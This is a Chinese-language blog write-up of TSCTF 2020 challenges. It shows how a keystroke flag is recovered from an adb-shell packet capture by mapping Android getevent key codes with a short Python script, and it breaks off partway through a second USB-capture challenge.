<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><title>TSCTF 2020 writeupï¼ˆpwn + miscï¼‰ | imlk's blog</title><link rel=stylesheet href=/css/style.css><link rel=stylesheet href=/css/fonts.css><link rel=preconnect href=https://fonts.googleapis.com><link rel=preconnect href=https://fonts.gstatic.com crossorigin><link href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@400;700&display=swap" rel=stylesheet></head><body><header class=header><a class=logo href=/>imlk's Blog</a><nav><ul class=menu><li><a href=/>ğŸ Home</a></li><li><a href=/about/>ğŸ‘‹About</a></li><li><a href=/archives/>ğŸ“œArchives</a></li><li><a href=/friends/>ğŸ”—Friends</a></li><li><a href=/dn42/>ğŸ•¸ï¸DN42</a></li><li><a href=/index.xml>ğŸ“¢Subscribe</a></li></ul></nav></header><hr><div class=article-meta><h1><span class=title>TSCTF 2020 writeupï¼ˆpwn + miscï¼‰</span></h1><span><span class=date>ğŸ“… 2020-10-19</span>
<span class=date>(æ›´æ–°äº2021-10-10)</span>
/
<span class=cats>ğŸ“š
<a href=https://blog.imlk.top/categories/ctf/>CTF</a></span>
/
<span class=tags>ğŸ·ï¸
<a href=https://blog.imlk.top/tags/ctf/>#CTF</a>
<a href=https://blog.imlk.top/tags/pwn/>#pwn</a>
<a href=https://blog.imlk.top/tags/android/>#Android</a></span></span><br></div><main><p>éƒ¨åˆ†é¢˜ç›®çš„binaryä¸‹è½½ï¼š<a href=/objects/tsctf-bin.tar.gz>tsctf-bin.tar.gz</a></p><h2 id=easy_adb>easy_adb</h2><p>è¿™é¢˜æˆ‘ä»¬æ‹¿åˆ°çš„æ˜¯ä¸€ä¸ª<code>.pcapng</code>æ ¼å¼çš„æ–‡ä»¶ï¼Œç”¨wiresharkå¯ä»¥ç›´æ¥æ‰“å¼€ï¼Œå‘ç°æ˜¯wiresharkæŠ“å–çš„ä¸€ç³»åˆ—çš„TCPåŒ…ï¼Œåˆ†æå†…å®¹åå¯ä»¥å‘ç°è¿™æ˜¯é€šè¿‡TCPå»ºç«‹çš„adb shellè¿æ¥ã€‚</p><p>ç‚¹å‡»<code>Analyze</code>-><code>Follow TCP Stream</code>å°±å¯ä»¥çœ‹åˆ°TCPæµä¿¡æ¯ï¼š</p><p><img src=/images/blog/66/image-20201019120452409.png alt=image-20201019120452409></p><p>æˆ‘ä»¬åªå…³æ³¨å­—ç¬¦ä¸²éƒ¨åˆ†ï¼Œæ‰€æœ‰çš„<code>raw:</code>åé¢çš„å†…å®¹éƒ½æ˜¯shellæ‰§è¡Œçš„æŒ‡ä»¤ã€‚ä¸€å¼€å§‹æ‰§è¡Œäº†ä¸€äº›echoè¯­å¥æ‰“å°æ¬¢è¿è¯­ã€‚ä¹‹åå‡ºç°äº†<code>getevent -lp</code>ã€<code>getevent -p</code>ã€ã€<code>getevent -l</code>ã€<code>getevent -t</code>å››æ¡å’Œè¾“å…¥äº‹ä»¶æœ‰å…³ çš„æŒ‡ä»¤ã€‚</p><p>é€šè¿‡åˆ†æå¾—çŸ¥ï¼Œæ’å…¥äº†ä¸€ä¸ª<code>Yubico Yubikey NEO OTP+U2F+CCID</code>è®¾å¤‡ï¼Œå®ƒé€šè¿‡æ¨¡æ‹Ÿä¸€ä¸ªé”®ç›˜å‘Androidè¾“å…¥ä¿¡æ¯ï¼Œé”®å’Œäº‹ä»¶IDè¡¨å¦‚ä¸‹ï¼š</p><pre tabindex=0><code>add device 1: /dev/input/event4
  name:     &#34;Yubico Yubikey NEO OTP+U2F+CCID&#34;
  events:
    KEY (0001): KEY_ESC               KEY_1                 KEY_2                 KEY_3                
                KEY_4                 KEY_5                 KEY_6                 KEY_7                
                KEY_8                 KEY_9                 KEY_0                 KEY_MINUS            
                KEY_EQUAL             KEY_BACKSPACE         KEY_TAB               KEY_Q                
                KEY_W                 KEY_E                 KEY_R                 KEY_T                
                KEY_Y                 KEY_U                 KEY_I                 KEY_O                
                KEY_P                 KEY_LEFTBRACE         KEY_RIGHTBRACE        KEY_ENTER            
                KEY_LEFTCTRL          KEY_A                 KEY_S                 KEY_D                
                KEY_F                 KEY_G                 KEY_H                 KEY_J                
                KEY_K                 KEY_L                 KEY_SEMICOLON         KEY_APOSTROPHE       
                KEY_GRAVE             KEY_LEFTSHIFT         KEY_BACKSLASH         KEY_Z                
                KEY_X                 KEY_C                 KEY_V                 KEY_B                
                KEY_N                 KEY_M                 KEY_COMMA             KEY_DOT              
                KEY_SLASH             KEY_RIGHTSHIFT        KEY_KPASTERISK        KEY_LEFTALT          
                KEY_SPACE             KEY_CAPSLOCK          KEY_F1                KEY_F2               
                KEY_F3                KEY_F4                KEY_F5                KEY_F6               
                KEY_F7                KEY_F8                KEY_F9                KEY_F10              
                KEY_NUMLOCK           KEY_SCROLLLOCK        KEY_KP7               KEY_KP8              
                KEY_KP9               KEY_KPMINUS           KEY_KP4               KEY_KP5              
                KEY_KP6               KEY_KPPLUS            KEY_KP1               KEY_KP2              
                KEY_KP3               KEY_KP0               KEY_KPDOT             KEY_102ND            
                KEY_F11               KEY_F12               KEY_KPENTER           KEY_RIGHTCTRL        
                KEY_KPSLASH           KEY_SYSRQ             KEY_RIGHTALT          KEY_HOME             
                KEY_UP                KEY_PAGEUP            KEY_LEFT              KEY_RIGHT            
                KEY_END               KEY_DOWN              KEY_PAGEDOWN          KEY_INSERT           
                KEY_DELETE            KEY_PAUSE             KEY_LEFTMETA          KEY_RIGHTMETA        
                KEY_COMPOSE          
    MSC (0004): MSC_SCAN             
    LED (0011): LED_NUML              LED_CAPSL             LED_SCROLLL           LED_COMPOSE          
                LED_KANA             
  input props:
    &lt;none&gt;
</code></pre><pre tabindex=0><code>add device 1: /dev/input/event4
  name:     &#34;Yubico Yubikey NEO OTP+U2F+CCID&#34;
  events:
    KEY (0001): 0001  0002  0003  0004  0005  0006  0007  0008 
                0009  000a  000b  000c  000d  000e  000f  0010 
                0011  0012  0013  0014  0015  0016  0017  0018 
                0019  001a  001b  001c  001d  001e  001f  0020 
                0021  0022  0023  0024  0025  0026  0027  0028 
                0029  002a  002b  002c  002d  002e  002f  0030 
                0031  0032  0033  0034  0035  0036  0037  0038 
                0039  003a  003b  003c  003d  003e  003f  0040 
                0041  0042  0043  0044  0045  0046  0047  0048 
                0049  004a  004b  004c  004d  004e  004f  0050 
                0051  0052  0053  0056  0057  0058  0060  0061 
                0062  0063  0064  0066  0067  0068  0069  006a 
                006b  006c  006d  006e  006f  0077  007d  007e 
                007f 
    MSC (0004): 0004 
    LED (0011): 0000  0001  0002  0003  0004 
  input props:
    &lt;none&gt;
</code></pre><p>æœ€å<code>getevent -t</code>å‘½ä»¤æŒ‰ç…§æ—¶é—´é¡ºåºç»™å‡ºäº†æœŸé—´è¯¥è®¾å¤‡çš„è¾“å…¥ä¿¡æ¯ï¼Œç»è¿‡ç®€å•çš„å¤„ç†ï¼Œæˆ‘ä»¬ä»ä¸­å‰¥ç¦»å‡ºæ‰€æœ‰çš„è¾“å‡ºï¼Œå¤§æ¦‚ç±»ä¼¼äºè¿™æ ·ï¼š</p><pre tabindex=0><code>[  269463.944942] 0014 0000 00000000
[  269463.944942] 0014 0001 00000000
[  269463.944942] 0000 0000 00000000
[  269463.952956] 0004 0004 00070019
[  269463.952956] 0001 002f 00000001
[  269463.952956] 0000 0000 00000000
[  269463.960909] 0004 0004 00070019
[  269463.960909] 0001 002f 00000000
...
</code></pre><p>é€šè¿‡åœ¨å®æœºä¸Šæµ‹è¯•æˆ‘ä»¬å‘ç°ï¼Œç¬¬ä¸€åˆ—æ˜¯æ—¶é—´ï¼Œç¬¬äºŒåˆ—æ˜¯äº‹ä»¶idï¼Œç¬¬ä¸‰åˆ—æ˜¯äº‹ä»¶çš„å€¼ï¼Œç¬¬å››åˆ—æ˜¯é¢å¤–çš„å‚æ•°ï¼Œæˆ‘ä»¬ä»ä¸­æ™’å‡ºç¬¬äºŒåˆ—ä¸º<code>0001</code>çš„è¡Œï¼ˆè¡¨ç¤ºKEYäº‹ä»¶ï¼‰ï¼Œç„¶åç­›å‡ºç¬¬å››åˆ—ä¸º<code>00000001</code>çš„è¡Œï¼ˆè¡¨ç¤ºæŒ‰é’®æŠ¬èµ·çš„äº‹ä»¶ï¼‰ï¼Œå–å‡ºç¬¬ä¸‰åˆ—çš„äº‹ä»¶idï¼š</p><pre tabindex=0><code>[&#39;002f&#39;,&#39;002f&#39;,&#39;0023&#39;,&#39;0020&#39;,&#39;0013&#39;,&#39;0014&#39;,&#39;0020&#39;,&#39;0020&#39;,&#39;0030&#39;,&#39;0031&#39;,&#39;002f&#39;,&#39;002f&#39;,&#39;0014&#39;,&#39;0026&#39;,&#39;0017&#39;,&#39;0012&#39;,&#39;0024&#39;,&#39;0020&#39;,&#39;0030&#39;,&#39;0022&#39;,&#39;0016&#39;,&#39;0031&#39;,&#39;0013&#39;,&#39;0017&#39;,&#39;002e&#39;,&#39;0017&#39;,&#39;0020&#39;,&#39;0024&#39;,&#39;0017&#39;,&#39;0016&#39;,&#39;002f&#39;,&#39;0023&#39;,&#39;0012&#39;,&#39;0021&#39;,&#39;0013&#39;,&#39;0020&#39;,&#39;0014&#39;,&#39;0017&#39;,&#39;0020&#39;,&#39;0026&#39;,&#39;0017&#39;,&#39;0024&#39;,&#39;0030&#39;,&#39;0013&#39;,&#39;001c&#39;]
</code></pre><p>å†æŠŠä¸Šé¢çš„ä¸¤ä¸ªè¡¨åšä¸€ä¸ªæ˜ å°„è¡¨å‡ºæ¥ï¼Œå†™ä¸€ä¸ªpythonè„šæœ¬å»åŒ¹é…è¿™äº›idå°±èƒ½å¾—åˆ°è¾“å…¥å†…å®¹ï¼š</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>ids_str <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;KEY_ESC&#39;</span>,<span style=color:#e6db74>&#39;KEY_1&#39;</span>,<span style=color:#e6db74>&#39;KEY_2&#39;</span>,<span style=color:#e6db74>&#39;KEY_3&#39;</span>,<span style=color:#e6db74>&#39;KEY_4&#39;</span>,<span style=color:#e6db74>&#39;KEY_5&#39;</span>,<span style=color:#e6db74>&#39;KEY_6&#39;</span>,<span style=color:#e6db74>&#39;KEY_7&#39;</span>,<span style=color:#e6db74>&#39;KEY_8&#39;</span>,<span style=color:#e6db74>&#39;KEY_9&#39;</span>,<span style=color:#e6db74>&#39;KEY_0&#39;</span>,<span style=color:#e6db74>&#39;KEY_MINUS&#39;</span>,<span style=color:#e6db74>&#39;KEY_EQUAL&#39;</span>,<span style=color:#e6db74>&#39;KEY_BACKSPACE&#39;</span>,<span style=color:#e6db74>&#39;KEY_TAB&#39;</span>,<span style=color:#e6db74>&#39;KEY_Q&#39;</span>,<span style=color:#e6db74>&#39;KEY_W&#39;</span>,<span style=color:#e6db74>&#39;KEY_E&#39;</span>,<span style=color:#e6db74>&#39;KEY_R&#39;</span>,<span style=color:#e6db74>&#39;KEY_T&#39;</span>,<span style=color:#e6db74>&#39;KEY_Y&#39;</span>,<span style=color:#e6db74>&#39;KEY_U&#39;</span>,<span style=color:#e6db74>&#39;KEY_I&#39;</span>,<span style=color:#e6db74>&#39;KEY_O&#39;</span>,<span style=color:#e6db74>&#39;KEY_P&#39;</span>,<span style=color:#e6db74>&#39;KEY_LEFTBRACE&#39;</span>,<span style=color:#e6db74>&#39;KEY_RIGHTBRACE&#39;</span>,<span style=color:#e6db74>&#39;KEY_ENTER&#39;</span>,<span style=color:#e6db74>&#39;KEY_LEFTCTRL&#39;</span>,<span style=color:#e6db74>&#39;KEY_A&#39;</span>,<span style=color:#e6db74>&#39;KEY_S&#39;</span>,<span style=color:#e6db74>&#39;KEY_D&#39;</span>,<span style=color:#e6db74>&#39;KEY_F&#39;</span>,<span style=color:#e6db74>&#39;KEY_G&#39;</span>,<span style=color:#e6db74>&#39;KEY_H&#39;</span>,<span style=color:#e6db74>&#39;KEY_J&#39;</span>,<span style=color:#e6db74>&#39;KEY_K&#39;</span>,<span style=color:#e6db74>&#39;KEY_L&#39;</span>,<span style=color:#e6db74>&#39;KEY_SEMICOLON&#39;</span>,<span style=color:#e6db74>&#39;KEY_APOSTROPHE&#39;</span>,<span style=color:#e6db74>&#39;KEY_GRAVE&#39;</span>,<span style=color:#e6db74>&#39;KEY_LEFTSHIFT&#39;</span>,<span style=color:#e6db74>&#39;KEY_BACKSLASH&#39;</span>,<span style=color:#e6db74>&#39;KEY_Z&#39;</span>,<span style=color:#e6db74>&#39;KEY_X&#39;</span>,<span style=color:#e6db74>&#39;KEY_C&#39;</span>,<span style=color:#e6db74>&#39;KEY_V&#39;</span>,<span style=color:#e6db74>&#39;KEY_B&#39;</span>,<span style=color:#e6db74>&#39;KEY_N&#39;</span>,<span style=color:#e6db74>&#39;KEY_M&#39;</span>,<span style=color:#e6db74>&#39;KEY_COMMA&#39;</span>,<span style=color:#e6db74>&#39;KEY_DOT&#39;</span>,<span style=color:#e6db74>&#39;KEY_SLASH&#39;</span>,<span style=color:#e6db74>&#39;KEY_RIGHTSHIFT&#39;</span>,<span style=color:#e6db74>&#39;KEY_KPASTERISK&#39;</span>,<span style=color:#e6db74>&#39;KEY_LEFTALT&#39;</span>,<span style=color:#e6db74>&#39;KEY_SPACE&#39;</span>,<span style=color:#e6db74>&#39;KEY_CAPSLOCK&#39;</span>,<span style=color:#e6db74>&#39;KEY_F1&#39;</span>,<span style=color:#e6db74>&#39;KEY_F2&#39;</span>,<span style=color:#e6db74>&#39;KEY_F3&#39;</span>,<span style=color:#e6db74>&#39;KEY_F4&#39;</span>,<span style=color:#e6db74>&#39;KEY_F5&#39;</span>,<span style=color:#e6db74>&#39;KEY_F6&#39;</span>,<span style=color:#e6db74>&#39;KEY_F7&#39;</span>,<span style=color:#e6db74>&#39;KEY_F8&#39;</span>,<span style=color:#e6db74>&#39;KEY_F9&#39;</span>,<span style=color:#e6db74>&#39;KEY_F10&#39;</span>,<span style=color:#e6db74>&#39;KEY_NUMLOCK&#39;</span>,<span style=color:#e6db74>&#39;KEY_SCROLLLOCK&#39;</span>,<span style=color:#e6db74>&#39;KEY_KP7&#39;</span>,<span style=color:#e6db74>&#39;KEY_KP8&#39;</span>,<span style=color:#e6db74>&#39;KEY_KP9&#39;</span>,<span style=color:#e6db74>&#39;KEY_KPMINUS&#39;</span>,<span style=color:#e6db74>&#39;KEY_KP4&#39;</span>,<span style=color:#e6db74>&#39;KEY_KP5&#39;</span>,<span style=color:#e6db74>&#39;KEY_KP6&#39;</span>,<span style=color:#e6db74>&#39;KEY_KPPLUS&#39;</span>,<span style=color:#e6db74>&#39;KEY_KP1&#39;</span>,<span style=color:#e6db74>&#39;KEY_KP2&#39;</span>,<span style=color:#e6db74>&#39;KEY_KP3&#39;</span>,<span style=color:#e6db74>&#39;KEY_KP0&#39;</span>,<span style=color:#e6db74>&#39;KEY_KPDOT&#39;</span>,<span style=color:#e6db74>&#39;KEY_102ND&#39;</span>,<span style=color:#e6db74>&#39;KEY_F11&#39;</span>,<span style=color:#e6db74>&#39;KEY_F12&#39;</span>,<span style=color:#e6db74>&#39;KEY_KPENTER&#39;</span>,<span style=color:#e6db74>&#39;KEY_RIGHTCTRL&#39;</span>,<span style=color:#e6db74>&#39;KEY_KPSLASH&#39;</span>,<span style=color:#e6db74>&#39;KEY_SYSRQ&#39;</span>,<span style=color:#e6db74>&#39;KEY_RIGHTALT&#39;</span>,<span style=color:#e6db74>&#39;KEY_HOME&#39;</span>,<span style=color:#e6db74>&#39;KEY_UP&#39;</span>,<span style=color:#e6db74>&#39;KEY_PAGEUP&#39;</span>,<span style=color:#e6db74>&#39;KEY_LEFT&#39;</span>,<span style=color:#e6db74>&#39;KEY_RIGHT&#39;</span>,<span style=color:#e6db74>&#39;KEY_END&#39;</span>,<span style=color:#e6db74>&#39;KEY_DOWN&#39;</span>,<span style=color:#e6db74>&#39;KEY_PAGEDOWN&#39;</span>,<span style=color:#e6db74>&#39;KEY_INSERT&#39;</span>,<span style=color:#e6db74>&#39;KEY_DELETE&#39;</span>,<span style=color:#e6db74>&#39;KEY_PAUSE&#39;</span>,<span style=color:#e6db74>&#39;KEY_LEFTMETA&#39;</span>,<span style=color:#e6db74>&#39;KEY_RIGHTMETA&#39;</span>,<span style=color:#e6db74>&#39;KEY_COMPOSE&#39;</span>]
</span></span><span style=display:flex><span>ids <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;0001&#39;</span>,<span style=color:#e6db74>&#39;0002&#39;</span>,<span style=color:#e6db74>&#39;0003&#39;</span>,<span style=color:#e6db74>&#39;0004&#39;</span>,<span style=color:#e6db74>&#39;0005&#39;</span>,<span style=color:#e6db74>&#39;0006&#39;</span>,<span style=color:#e6db74>&#39;0007&#39;</span>,<span style=color:#e6db74>&#39;0008&#39;</span>,<span style=color:#e6db74>&#39;0009&#39;</span>,<span style=color:#e6db74>&#39;000a&#39;</span>,<span style=color:#e6db74>&#39;000b&#39;</span>,<span style=color:#e6db74>&#39;000c&#39;</span>,<span style=color:#e6db74>&#39;000d&#39;</span>,<span style=color:#e6db74>&#39;000e&#39;</span>,<span style=color:#e6db74>&#39;000f&#39;</span>,<span style=color:#e6db74>&#39;0010&#39;</span>,<span style=color:#e6db74>&#39;0011&#39;</span>,<span style=color:#e6db74>&#39;0012&#39;</span>,<span style=color:#e6db74>&#39;0013&#39;</span>,<span style=color:#e6db74>&#39;0014&#39;</span>,<span style=color:#e6db74>&#39;0015&#39;</span>,<span style=color:#e6db74>&#39;0016&#39;</span>,<span style=color:#e6db74>&#39;0017&#39;</span>,<span style=color:#e6db74>&#39;0018&#39;</span>,<span style=color:#e6db74>&#39;0019&#39;</span>,<span style=color:#e6db74>&#39;001a&#39;</span>,<span style=color:#e6db74>&#39;001b&#39;</span>,<span style=color:#e6db74>&#39;001c&#39;</span>,<span style=color:#e6db74>&#39;001d&#39;</span>,<span style=color:#e6db74>&#39;001e&#39;</span>,<span style=color:#e6db74>&#39;001f&#39;</span>,<span style=color:#e6db74>&#39;0020&#39;</span>,<span style=color:#e6db74>&#39;0021&#39;</span>,<span style=color:#e6db74>&#39;0022&#39;</span>,<span style=color:#e6db74>&#39;0023&#39;</span>,<span style=color:#e6db74>&#39;0024&#39;</span>,<span style=color:#e6db74>&#39;0025&#39;</span>,<span style=color:#e6db74>&#39;0026&#39;</span>,<span style=color:#e6db74>&#39;0027&#39;</span>,<span style=color:#e6db74>&#39;0028&#39;</span>,<span style=color:#e6db74>&#39;0029&#39;</span>,<span style=color:#e6db74>&#39;002a&#39;</span>,<span style=color:#e6db74>&#39;002b&#39;</span>,<span style=color:#e6db74>&#39;002c&#39;</span>,<span style=color:#e6db74>&#39;002d&#39;</span>,<span style=color:#e6db74>&#39;002e&#39;</span>,<span style=color:#e6db74>&#39;002f&#39;</span>,<span style=color:#e6db74>&#39;0030&#39;</span>,<span style=color:#e6db74>&#39;0031&#39;</span>,<span style=color:#e6db74>&#39;0032&#39;</span>,<span style=color:#e6db74>&#39;0033&#39;</span>,<span style=color:#e6db74>&#39;0034&#39;</span>,<span style=color:#e6db74>&#39;0035&#39;</span>,<span style=color:#e6db74>&#39;0036&#39;</span>,<span style=color:#e6db74>&#39;0037&#39;</span>,<span style=color:#e6db74>&#39;0038&#39;</span>,<span style=color:#e6db74>&#39;0039&#39;</span>,<span style=color:#e6db74>&#39;003a&#39;</span>,<span style=color:#e6db74>&#39;003b&#39;</span>,<span style=color:#e6db74>&#39;003c&#39;</span>,<span style=color:#e6db74>&#39;003d&#39;</span>,<span style=color:#e6db74>&#39;003e&#39;</span>,<span style=color:#e6db74>&#39;003f&#39;</span>,<span style=color:#e6db74>&#39;0040&#39;</span>,<span style=color:#e6db74>&#39;0041&#39;</span>,<span style=color:#e6db74>&#39;0042&#39;</span>,<span style=color:#e6db74>&#39;0043&#39;</span>,<span style=color:#e6db74>&#39;0044&#39;</span>,<span style=color:#e6db74>&#39;0045&#39;</span>,<span style=color:#e6db74>&#39;0046&#39;</span>,<span style=color:#e6db74>&#39;0047&#39;</span>,<span style=color:#e6db74>&#39;0048&#39;</span>,<span style=color:#e6db74>&#39;0049&#39;</span>,<span style=color:#e6db74>&#39;004a&#39;</span>,<span style=color:#e6db74>&#39;004b&#39;</span>,<span style=color:#e6db74>&#39;004c&#39;</span>,<span style=color:#e6db74>&#39;004d&#39;</span>,<span style=color:#e6db74>&#39;004e&#39;</span>,<span style=color:#e6db74>&#39;004f&#39;</span>,<span style=color:#e6db74>&#39;0050&#39;</span>,<span style=color:#e6db74>&#39;0051&#39;</span>,<span style=color:#e6db74>&#39;0052&#39;</span>,<span style=color:#e6db74>&#39;0053&#39;</span>,<span style=color:#e6db74>&#39;0056&#39;</span>,<span style=color:#e6db74>&#39;0057&#39;</span>,<span style=color:#e6db74>&#39;0058&#39;</span>,<span style=color:#e6db74>&#39;0060&#39;</span>,<span style=color:#e6db74>&#39;0061&#39;</span>,<span style=color:#e6db74>&#39;0062&#39;</span>,<span style=color:#e6db74>&#39;0063&#39;</span>,<span style=color:#e6db74>&#39;0064&#39;</span>,<span style=color:#e6db74>&#39;0066&#39;</span>,<span style=color:#e6db74>&#39;0067&#39;</span>,<span style=color:#e6db74>&#39;0068&#39;</span>,<span style=color:#e6db74>&#39;0069&#39;</span>,<span style=color:#e6db74>&#39;006a&#39;</span>,<span style=color:#e6db74>&#39;006b&#39;</span>,<span style=color:#e6db74>&#39;006c&#39;</span>,<span style=color:#e6db74>&#39;006d&#39;</span>,<span style=color:#e6db74>&#39;006e&#39;</span>,<span style=color:#e6db74>&#39;006f&#39;</span>,<span style=color:#e6db74>&#39;0077&#39;</span>,<span style=color:#e6db74>&#39;007d&#39;</span>,<span style=color:#e6db74>&#39;007e&#39;</span>,<span style=color:#e6db74>&#39;007f&#39;</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>ids_map <span style=color:#f92672>=</span> dict(zip(ids, ids_str))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>input_ids <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#39;002f&#39;</span>,<span style=color:#e6db74>&#39;002f&#39;</span>,<span style=color:#e6db74>&#39;0023&#39;</span>,<span style=color:#e6db74>&#39;0020&#39;</span>,<span style=color:#e6db74>&#39;0013&#39;</span>,<span style=color:#e6db74>&#39;0014&#39;</span>,<span style=color:#e6db74>&#39;0020&#39;</span>,<span style=color:#e6db74>&#39;0020&#39;</span>,<span style=color:#e6db74>&#39;0030&#39;</span>,<span style=color:#e6db74>&#39;0031&#39;</span>,<span style=color:#e6db74>&#39;002f&#39;</span>,<span style=color:#e6db74>&#39;002f&#39;</span>,<span style=color:#e6db74>&#39;0014&#39;</span>,<span style=color:#e6db74>&#39;0026&#39;</span>,<span style=color:#e6db74>&#39;0017&#39;</span>,<span style=color:#e6db74>&#39;0012&#39;</span>,<span style=color:#e6db74>&#39;0024&#39;</span>,<span style=color:#e6db74>&#39;0020&#39;</span>,<span style=color:#e6db74>&#39;0030&#39;</span>,<span style=color:#e6db74>&#39;0022&#39;</span>,<span style=color:#e6db74>&#39;0016&#39;</span>,<span style=color:#e6db74>&#39;0031&#39;</span>,<span style=color:#e6db74>&#39;0013&#39;</span>,<span style=color:#e6db74>&#39;0017&#39;</span>,<span style=color:#e6db74>&#39;002e&#39;</span>,<span style=color:#e6db74>&#39;0017&#39;</span>,<span style=color:#e6db74>&#39;0020&#39;</span>,<span style=color:#e6db74>&#39;0024&#39;</span>,<span style=color:#e6db74>&#39;0017&#39;</span>,<span style=color:#e6db74>&#39;0016&#39;</span>,<span style=color:#e6db74>&#39;002f&#39;</span>,<span style=color:#e6db74>&#39;0023&#39;</span>,<span style=color:#e6db74>&#39;0012&#39;</span>,<span style=color:#e6db74>&#39;0021&#39;</span>,<span style=color:#e6db74>&#39;0013&#39;</span>,<span style=color:#e6db74>&#39;0020&#39;</span>,<span style=color:#e6db74>&#39;0014&#39;</span>,<span style=color:#e6db74>&#39;0017&#39;</span>,<span style=color:#e6db74>&#39;0020&#39;</span>,<span style=color:#e6db74>&#39;0026&#39;</span>,<span style=color:#e6db74>&#39;0017&#39;</span>,<span style=color:#e6db74>&#39;0024&#39;</span>,<span style=color:#e6db74>&#39;0030&#39;</span>,<span style=color:#e6db74>&#39;0013&#39;</span>,<span style=color:#e6db74>&#39;001c&#39;</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>result <span style=color:#f92672>=</span> [ids_map[x][<span style=color:#ae81ff>4</span>:]<span style=color:#f92672>.</span>lower() <span style=color:#66d9ef>for</span> x <span style=color:#f92672>in</span> input_ids]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(result)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># output:</span>
</span></span><span style=display:flex><span><span style=color:#75715e># [&#39;v&#39;, &#39;v&#39;, &#39;h&#39;, &#39;d&#39;, &#39;r&#39;, &#39;t&#39;, &#39;d&#39;, &#39;d&#39;, &#39;b&#39;, &#39;n&#39;, &#39;v&#39;, &#39;v&#39;, &#39;t&#39;, &#39;l&#39;, &#39;i&#39;, &#39;e&#39;, &#39;j&#39;, &#39;d&#39;, &#39;b&#39;, &#39;g&#39;, &#39;u&#39;, &#39;n&#39;, &#39;r&#39;, &#39;i&#39;, &#39;c&#39;, &#39;i&#39;, &#39;d&#39;, &#39;j&#39;, &#39;i&#39;, &#39;u&#39;, &#39;v&#39;, &#39;h&#39;, &#39;e&#39;, &#39;f&#39;, &#39;r&#39;, &#39;d&#39;, &#39;t&#39;, &#39;i&#39;, &#39;d&#39;, &#39;l&#39;, &#39;i&#39;, &#39;j&#39;, &#39;b&#39;, &#39;r&#39;, &#39;enter&#39;]</span>
</span></span></code></pre></div><p>è¿™æ˜¯yubikeyçš„OTPä¸€æ¬¡æ€§å¯†ç ã€‚</p><p>åˆ†æä¸€å¼€å§‹çš„æ¬¢è¿è¯­ï¼Œå…¶ä¸­æœ‰ä¸€æ¡ï¼š</p><pre tabindex=0><code>echo Your flag will be tsctf{*data*}
</code></pre><p>æœ€ååªè¦æŠŠè¾“å…¥å†…å®¹å¥—ä¸Š<code>tsctf{</code> <code>}</code>å°±å¯ä»¥äº¤äº†</p><h2 id=super_easy_adb>super_easy_adb</h2><p>è¿™é¢˜æˆ‘ä»¬æ‹¿åˆ°çš„ä¾ç„¶æ˜¯ä¸€ä¸ª<code>.pcapng</code>æ ¼å¼çš„æ–‡ä»¶ï¼Œè€å¥—è·¯ç”¨wiresharkå¯ä»¥ç›´æ¥æ‰“å¼€ï¼Œå‘ç°è¿™æ¬¡æŠ“å–çš„æ˜¯USBåè®®çš„åŒ…ï¼Œåˆ†æåè®®å‘ç°ä¾ç„¶æ˜¯adb shellã€‚</p><p>è¿™æ¬¡æ²¡æœ‰åƒTCPåŒ…é‚£æ ·çš„é€‰é¡¹è®©æˆ‘ä»¬å¯ä»¥å¯¼å‡ºåŒ…çš„å†…å®¹ï¼Œä¸è¿‡æˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨vscodeæ‰“å¼€è¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Œç›´æ¥çœ‹å…¶ä¸­çš„å­—ç¬¦ä¸²ï¼š</p><p>ç”¨<code>strings</code>å‘½ä»¤å¯ä»¥æå–å‡ºæ–‡ä»¶ä¸­çš„å­—ç¬¦ä¸²å†…å®¹ï¼š</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh><span style=display:flex><span>strings -s <span style=color:#e6db74>&#39;&#39;</span> -w ./super_easy_adb.pcapng
</span></span></code></pre></div><p><img src=/images/blog/66/image-20201019124706584.png alt=image-20201019124706584></p><p>é¦–å…ˆçœ‹<code>raw:</code>åé¢çš„å†…å®¹ï¼Œä¾ç„¶æ˜¯<code>getevent -lp</code>ã€<code>getevent -p</code>ã€ã€<code>getevent -l</code>ã€<code>getevent -t</code>ï¼Œä½†æ˜¯è¿™æ¬¡çš„è¾“å…¥è®¾å¤‡å˜æˆäº†<code>sec_touchscreen</code>ï¼Œåº”è¯¥æ˜¯ä¸€ä¸ªè§¦å±è®¾å¤‡ã€‚</p><p>è€è§„çŸ©æŠŠæ˜ å°„è¡¨æå‡ºæ¥ï¼š</p><pre tabindex=0><code>add device 2: /dev/input/event2
  name:     &#34;sec_touchscreen&#34;
  events:    KEY (0001): KEY_HOMEPAGE         OKAYyWRTE BTN_TOOL_FINGER       BTN_TOUCH             01c7                     
             ABS (0003): ABS_X                 : value 0, min 0, max 1439, fuzz 0, flat 0, resolution 0
                ABS_Y                 : value 0, min 0, max 2959, fuzz 0, flat 0, resolution 0
                ABS_PRESSURE          : value 0, min 0, max 63, fuzz 0, flat 0, resolution 0
                ABS_MT_SLOT           : value 0, min 0, max 9, fuzz 0, flat 0, resolution 0
                ABS_MT_TOUCH_MAJOR    : value 0, min 0, max 255, fuzz 0, flat 0, resolution 0
                ABS_MT_TOUCH_MINOR    : value 0, min 0, max 255, fuzz 0, flat 0, resolution 0
                ABS_MT_POSITION_X     : value 0, min 0, max 1439, fuzz 0, flat 0, resolution 0
                ABS_MT_POSITION_Y     : value 0, min 0, max 2959, fuzz 0, flat 0, resolution 0
                ABS_MT_TRACKING_ID    : value 0, min 0, max 65535, fuzz 0, flat 0, resolution 0
                ABS_MT_PRESSURE       : value 0, min 0, max 63, fuzz 0, flat 0, resolution 0
                003e                  : value 126, min 0, max 65535, fuzz 0, flat 0, resolution 0
